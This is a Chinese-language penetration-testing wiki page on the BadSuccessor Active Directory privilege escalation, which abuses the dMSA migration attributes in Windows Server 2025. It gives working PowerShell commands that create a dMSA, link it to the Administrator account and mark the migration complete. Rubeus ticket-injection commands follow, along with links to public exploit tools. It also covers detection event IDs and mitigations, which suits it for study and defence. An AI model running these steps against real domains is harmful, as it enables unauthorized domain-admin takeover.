# BadSuccessor: 通过委托的MSA迁移滥用进行特权升级

{{#include ../../banners/hacktricks-training.md}}

## 概述

委托的托管服务账户（**dMSA**）是**gMSA**的下一代继任者，随Windows Server 2025发布。合法的迁移工作流程允许管理员用dMSA替换*旧*账户（用户、计算机或服务账户），同时透明地保留权限。该工作流程通过PowerShell cmdlets暴露，如`Start-ADServiceAccountMigration`和`Complete-ADServiceAccountMigration`，并依赖于**dMSA对象**的两个LDAP属性：

* **`msDS-ManagedAccountPrecededByLink`** – *DN链接*到被取代的（旧）账户。
* **`msDS-DelegatedMSAState`**       – 迁移状态（`0` = 无，`1` = 进行中，`2` = *已完成*）。

如果攻击者可以在OU中创建**任何**dMSA并直接操纵这两个属性，LSASS和KDC将把dMSA视为链接账户的*继任者*。当攻击者随后以dMSA身份进行身份验证时，**他们继承了链接账户的所有权限**——如果管理员账户被链接，则最高可达**域管理员**。

该技术在2025年被Unit 42称为**BadSuccessor**。在撰写时**没有安全补丁**可用；只有加强OU权限可以缓解此问题。

### 攻击前提条件

1. 一个*被允许*在**组织单位（OU）**内创建对象的账户*并且*至少具有以下之一：
* `Create Child` → **`msDS-DelegatedManagedServiceAccount`**对象类
* `Create Child` → **`All Objects`**（通用创建）
2. 与LDAP和Kerberos的网络连接（标准域加入场景/远程攻击）。

## 枚举易受攻击的OU

Unit 42发布了一个PowerShell辅助脚本，解析每个OU的安全描述符并突出显示所需的ACE：
```powershell
Get-BadSuccessorOUPermissions.ps1 -Domain contoso.local
```
在后台，脚本运行一个分页的 LDAP 搜索 `(objectClass=organizationalUnit)` 并检查每个 `nTSecurityDescriptor` 是否具有

* `ADS_RIGHT_DS_CREATE_CHILD` (0x0001)
* `Active Directory Schema ID: 31ed51fa-77b1-4175-884a-5c6f3f6f34e8` (对象类 *msDS-DelegatedManagedServiceAccount*)

## 利用步骤

一旦识别出可写的 OU，攻击只需 3 次 LDAP 写入：
```powershell
# 1. Create a new delegated MSA inside the delegated OU
New-ADServiceAccount -Name attacker_dMSA \
-DNSHostName host.contoso.local \
-Path "OU=DelegatedOU,DC=contoso,DC=com"

# 2. Point the dMSA to the target account (e.g. Domain Admin)
Set-ADServiceAccount attacker_dMSA -Add \
@{msDS-ManagedAccountPrecededByLink="CN=Administrator,CN=Users,DC=contoso,DC=com"}

# 3. Mark the migration as *completed*
Set-ADServiceAccount attacker_dMSA -Replace @{msDS-DelegatedMSAState=2}
```
在复制后，攻击者可以简单地 **logon** 为 `attacker_dMSA$` 或请求 Kerberos TGT – Windows 将构建 *superseded* 账户的令牌。

### 自动化

几个公共 PoC 包装了整个工作流程，包括密码检索和票证管理：

* SharpSuccessor (C#) – [https://github.com/logangoins/SharpSuccessor](https://github.com/logangoins/SharpSuccessor)
* BadSuccessor.ps1 (PowerShell) – [https://github.com/LuemmelSec/Pentest-Tools-Collection/blob/main/tools/ActiveDirectory/BadSuccessor.ps1](https://github.com/LuemmelSec/Pentest-Tools-Collection/blob/main/tools/ActiveDirectory/BadSuccessor.ps1)
* NetExec 模块 – `badsuccessor` (Python) – [https://github.com/Pennyw0rth/NetExec](https://github.com/Pennyw0rth/NetExec)

### 后期利用
```powershell
# Request a TGT for the dMSA and inject it (Rubeus)
Rubeus asktgt /user:attacker_dMSA$ /password:<ClearTextPwd> /domain:contoso.local
Rubeus ptt /ticket:<Base64TGT>

# Access Domain Admin resources
dir \\DC01\C$
```
## 检测与狩猎

在组织单位（OUs）上启用**对象审计**，并监控以下Windows安全事件：

* **5137** – 创建**dMSA**对象
* **5136** – 修改**`msDS-ManagedAccountPrecededByLink`**
* **4662** – 特定属性更改
* GUID `2f5c138a-bd38-4016-88b4-0ec87cbb4919` → `msDS-DelegatedMSAState`
* GUID `a0945b2b-57a2-43bd-b327-4d112a4e8bd1` → `msDS-ManagedAccountPrecededByLink`
* **2946** – dMSA的TGT签发

关联`4662`（属性修改）、`4741`（计算机/服务账户创建）和`4624`（后续登录）可以快速突出BadSuccessor活动。像**XSIAM**这样的XDR解决方案提供现成的查询（见参考文献）。

## 缓解措施

* 应用**最小权限**原则 – 仅将*服务账户*管理委派给受信任的角色。
* 从不明确需要的OUs中移除`Create Child` / `msDS-DelegatedManagedServiceAccount`。
* 监控上述事件ID，并对*非Tier-0*身份创建或编辑dMSA进行警报。

## 另见

{{#ref}}
golden-dmsa-gmsa.md
{{#endref}}

## 参考文献

- [Unit42 – 当好账户变坏：利用委派的托管服务账户](https://unit42.paloaltonetworks.com/badsuccessor-attack-vector/)
- [SharpSuccessor PoC](https://github.com/logangoins/SharpSuccessor)
- [BadSuccessor.ps1 – 渗透测试工具集合](https://github.com/LuemmelSec/Pentest-Tools-Collection/blob/main/tools/ActiveDirectory/BadSuccessor.ps1)
- [NetExec BadSuccessor模块](https://github.com/Pennyw0rth/NetExec/blob/main/nxc/modules/badsuccessor.py)

{{#include ../../banners/hacktricks-training.md}}
